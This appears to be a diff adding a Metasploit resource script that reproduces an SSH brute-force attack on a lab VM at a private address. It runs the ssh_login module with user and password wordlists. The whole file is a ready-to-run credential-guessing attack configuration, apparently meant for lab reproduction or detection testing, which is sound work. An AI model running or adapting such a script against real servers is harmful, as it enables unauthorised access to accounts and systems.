@@ -1,0 +1,20 @@
+# Metasploit resource script for SSH brute-force attack reproduction
+# Usage: msfconsole -r metasploit-resource.rc
+#
+# Prerequisites:
+#   - Target VM running at 192.168.254.131 with SSH on port 22
+#   - Wordlists at /home/kali/lab-attack/users.txt and passwords.txt
+#   - Adjust paths and IPs to match your environment
+
+use auxiliary/scanner/ssh/ssh_login
+
+set RHOSTS 192.168.254.131
+set RPORT 22
+set USER_FILE /home/kali/lab-attack/users.txt
+set PASS_FILE /home/kali/lab-attack/passwords.txt
+set THREADS 4
+set STOP_ON_SUCCESS false
+set VERBOSE true
+set CreateSession false
+
+run
